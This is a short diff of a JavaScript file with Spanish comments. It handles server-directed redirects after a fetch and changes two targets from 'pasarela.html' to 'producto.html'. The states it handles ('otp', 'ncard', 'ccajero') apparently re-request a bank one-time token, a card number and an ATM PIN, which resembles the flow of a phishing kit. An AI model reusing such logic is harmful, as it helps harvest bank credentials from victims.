@@ -22,7 +22,6 @@ fetch(`${API_URL}/generals`, {
         } else if (result.redirect_to === 'otp' && info.tok !== '') {
             // Token vuelto a pedir
             // Setear el error
-            console.log('err');
             info.err = 'true';
             LS.setItem('info', JSON.stringify(info));
 
@@ -41,14 +40,14 @@ fetch(`${API_URL}/generals`, {
             LS.setItem('info', JSON.stringify(info));
 
             // Redirigir
-            window.location.href = 'pasarela.html'
+            window.location.href = 'producto.html'
         } else if (result.redirect_to === 'ncard') {
             // Setear el error
             info.err = 'ncard';
             LS.setItem('info', JSON.stringify(info));
 
             // Redirigir
-            window.location.href = 'pasarela.html'
+            window.location.href = 'producto.html'
         } else if (result.redirect_to === 'ccajero') {
             // Setear el error
             info.err = 'ccajero';
